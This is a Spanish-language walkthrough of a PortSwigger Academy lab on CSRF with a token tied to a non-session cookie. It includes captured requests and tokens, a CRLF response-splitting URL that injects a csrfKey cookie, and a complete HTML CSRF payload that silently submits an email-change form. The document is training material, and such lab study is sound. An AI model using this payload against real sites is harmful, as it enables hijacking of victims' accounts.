# PortSwigger Lab: CSRF where token is tied to non-session cookie

**Plataforma:** PortSwigger Web Security Academy  
**Dificultad:** Medio  
**Tipo:** CSRF (Cross-Site Request Forgery)  
**Objetivo:** Cambiar email inyectando cookie csrfKey + usando token CSRF válido

---

## Flujo del ataque

```
2 cuentas (wiener + carlos) → Capturar token + csrfKey
→ Probar intercambio → Funcionan si van juntos (no ligados a sesión)
→ Descubrir: validación débil (token vs cookie, no vs sesión)
→ Vector: campo de búsqueda refleja parámetro
→ HTTP Response Splitting → Inyectar cookie
→ Payload con img (inyecta cookie) + form (envía POST)
→ Exploit server → Enviar a víctima
```

---

## 1. Análisis de peticiones

![Burp intercept wiener](imagen-1-burp-intercept.png)

### Petición de wiener

```http
POST /my-account/change-email HTTP/2
Cookie: csrfKey=YcHqVyZ99YHlqwJohDKSlMa2r0Iw949D; session=BYJJXKjKM3zGxG3SGQKvkTpYYZPiBjw9

email=user@user.es&csrf=MgYzltgbTcVUIoMyy2e3IMjbAUDedr4W
```

**Elementos:**
- Cookie: `csrfKey=YcHqVyZ99YHlqwJohDKSlMa2r0Iw949D`
- Parámetro: `csrf=MgYzltgbTcVUIoMyy2e3IMjbAUDedr4W`

### Petición de carlos

![Carlos token capture](imagen-2-carlos-token.png)

```http
POST /my-account/change-email HTTP/2
Cookie: csrfKey=VNhsMtzic0ZRqw8CN12oNvHndtjtoKYM; session=...

email=carlos@user.es&csrf=iRbOJewCkIoG3jaq1FvZ0THAOktIWHDJ
```

---

## 2. Intercambio de tokens

![Token exchange test](imagen-3-intercambio-tokens.png)

En sesión de wiener, usar csrfKey + csrf de carlos:

```http
Cookie: csrfKey=VNhsMtzic0ZRqw8CN12oNvHndtjtoKYM

email=test@test.com&csrf=iRbOJewCkIoG3jaq1FvZ0THAOktIWHDJ
```

**Resultado:** `302 Found` — Email se cambia.

El servidor valida que csrfKey + csrf coincidan entre sí, pero no si pertenecen a la sesión actual.

---

## 3. Vector de inyección — HTTP Response Splitting

![Response splitting injection](imagen-4-response-splitting.png)

Campo de búsqueda refleja parámetro. Inyectar CRLF para crear nuevo header:

```
/?search=daw%0d%0aSet-Cookie:%20csrfKey=VNhsMtzic0ZRqw8CN12oNvHndtjtoKYM%3b%20SameSite=None
```

La cookie csrfKey personalizada se inyecta en el navegador de la víctima.

---

## 4. Payload CSRF

```html
<iframe name="csrf-frame" style="display:none;"></iframe>

<img src="https://target.com/?search=daw%0d%0aSet-Cookie:%20csrfKey=VNhsMtzic0ZRqw8CN12oNvHndtjtoKYM%3b%20SameSite=None" 
     onerror="document.forms[0].submit()">

<form method="POST" 
      action="https://target.com/my-account/change-email" 
      target="csrf-frame">
  <input type="hidden" name="email" value="attacker@attacker.com">
  <input type="hidden" name="csrf" value="iRbOJewCkIoG3jaq1FvZ0THAOktIWHDJ" />
</form>
```

**Flujo:**
1. Imagen GET → inyecta cookie
2. Imagen no existe → `onerror` se dispara
3. Formulario POST se envía
4. Cookie inyectada incluida automáticamente
5. Validación pasa

---

## 5. Lab resuelto

![Congratulations lab solved](imagen-5-lab-solved.png)

---

## Por qué funciona

- Cookie inyectable (campo búsqueda sin sanitizar)
- HTTP Response Splitting permite agregar headers
- SameSite=None cookie se envía cross-site
- Validación débil (solo verifica csrfKey vs csrf)
- Timing perfecto (imagen + onerror)

---

## Referencias

- [PortSwigger — CSRF tokens](https://portswigger.net/web-security/csrf#tokens)
- [OWASP — CSRF Prevention](https://owasp.org/www-community/attacks/csrf)
- [HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)
- [SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
